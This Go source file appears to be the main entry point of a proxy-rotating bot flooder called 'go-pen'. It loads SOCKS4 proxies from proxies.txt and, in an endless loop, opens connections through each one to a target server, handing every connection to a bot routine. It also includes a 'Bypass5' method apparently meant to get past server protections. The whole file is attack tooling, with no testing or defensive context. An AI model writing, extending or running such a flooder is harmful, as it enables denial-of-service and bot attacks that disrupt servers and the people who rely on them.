package main

import (
	"bufio"
	"fmt"
	"go-pen/bot"
	"go-pen/config"
	"go-pen/methods"
	"log"
	"os"
	"time"

	"h12.io/socks"
)

func parseProxies() []string {
	file, err := os.Open("proxies.txt")

	if err != nil {
		log.Fatal("Something is wrong with proxies.txt, ", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var proxies []string

	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	file.Close()

	return proxies
}

func connect(proxyAddress string, serverAddress string, data *methods.Data, guard chan struct{}) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	if err != nil {
		<-guard
	} else {
		for {
			if methods.Bypass5(data, conn) {
				fmt.Println(proxyAddress)
				<-guard
				return
			}

			time.Sleep(1 * time.Millisecond)
		}
	}
}

func createProxyBot(proxyAddress string, serverAddress string, config *config.Config) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	if err != nil {
		<-config.Guard
		log.Printf("Dial: %v", err)
	} else {
		bot.Maidan(config, conn)
	}
}

func main() {
	proxies := parseProxies()
	config := config.GetConfig()

	config.Address = config.Host + ":" + config.Port
	config.Guard = make(chan struct{}, config.Connections)

	for {
		for _, proxy := range proxies {
			config.Guard <- struct{}{}
			go createProxyBot(proxy, config.Address, config)
			time.Sleep(10 * time.Millisecond)
		}
	}
}
